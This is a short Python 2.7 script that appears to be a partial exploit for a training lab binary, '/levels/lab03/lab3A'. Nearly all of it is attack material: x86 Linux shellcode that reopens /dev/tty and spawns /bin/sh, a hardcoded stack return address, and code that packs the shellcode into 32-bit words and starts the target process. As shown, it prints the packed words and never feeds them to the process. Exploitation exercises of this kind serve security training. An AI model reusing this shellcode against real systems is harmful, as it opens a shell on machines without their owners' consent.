#!/usr/bin/python2.7
import struct
import subprocess

BIN_SH = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68\x2f\x74\x74\x79\x68\x2f\x64\x65\x76\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"
RET_ADDR = "\x00\xF4\xFF\xBF"
BIN_PATH = "/levels/lab03/lab3A"

shellcode = []

for i in xrange(0, len(BIN_SH), 4):
    chunk = BIN_SH[i:i+4]
    value = struct.unpack("<L", chunk)[0]
    shellcode.append(value)

p = subprocess.Popen([BIN_PATH], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

print shellcode
